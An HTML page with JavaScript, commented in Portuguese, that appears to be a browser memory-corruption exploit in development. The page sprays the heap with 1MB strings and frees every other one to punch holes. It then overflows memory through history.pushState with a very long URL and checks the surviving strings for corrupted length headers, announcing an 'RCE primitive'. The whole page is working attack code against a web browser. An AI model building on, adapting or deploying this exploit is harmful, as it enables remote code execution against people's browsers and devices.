<!DOCTYPE html>
<html>
<head>
    <title>Victim Slider (Aligning the Target)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-top: 20px;}
        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
        .hit { color: yellow; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Victim Slider (Deslizando o Alvo)</h1>
    <p>O exploit fica fixo em 709520. O tamanho da vítima muda para alinhar o Header.</p>

    <button onclick="startSlider()">INICIAR DESLIZAMENTO</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // MANTEMOS O OFFSET FIXO QUE SABEMOS QUE FUNCIONA
        const FIXED_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 

        // Base de 1MB
        const BASE_TARGET_SIZE = 1024 * 1024; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startSlider() {
            // Vamos diminuir o tamanho da vítima de 8 em 8 bytes
            // Isso faz o objeto "andar" para trás na memória dentro do balde
            const SHIFTS = [0, 8, 16, 24, 32, 40, 48, 56, 64, 128];

            for (let shift of SHIFTS) {
                // Calcula o novo tamanho da vítima
                // Header (24) + Shift
                let currentPayloadSize = BASE_TARGET_SIZE - 24 - shift;
                
                log(`----------------------------------------`);
                log(`TESTANDO VÍTIMA: 1MB - ${shift} bytes`);

                // 1. Limpeza
                victims = [];
                await forceGC();

                try {
                    // 2. SPRAY (Com tamanho ajustado)
                    let rawBuffer = new Uint8Array(currentPayloadSize);
                    rawBuffer.fill(0x42); 
                    let decoder = new TextDecoder("utf-8");
                    let baseString = decoder.decode(rawBuffer);

                    const SPRAY_COUNT = 80;
                    
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let s = i + "_" + baseString.substring((i+"_").length);
                        victims.push(s);
                    }

                    // 3. BURACOS
                    for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                    await forceGC();

                    // 4. EXPLOIT (Fixo)
                    setTimeout(() => {
                        let buffer = "A".repeat(FIXED_OFFSET);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        history.pushState({}, "slider", "/" + buffer);
                    }, 100);

                    // Pequeno delay para o overflow acontecer
                    await new Promise(r => setTimeout(r, 600));

                    // 5. CHECAGEM
                    if (checkVictims(currentPayloadSize, shift)) {
                        return; // Venceu!
                    }

                } catch(e) {
                    log("Erro (Tentando próxima...): " + e.message);
                }
                
                // Limpa para a próxima rodada
                victims = null;
                await forceGC();
                await new Promise(r => setTimeout(r, 500));
            }
            log("Fim do teste. Tente reiniciar.");
        }

        function checkVictims(expectedLen, shift) {
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (Length)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com Shift -${shift}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        return true;
                    }

                    // SUCESSO PARCIAL (Dados)
                    if (msg.charCodeAt(0) === 1) {
                        log(`[Shift -${shift}] Dados atingidos. Header ainda seguro.`, 'hit');
                        return false; // Continua tentando outros shifts
                    }
                } catch(e) {}
            }
            return false;
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 300));
        }
    </script>
</body>
</html>
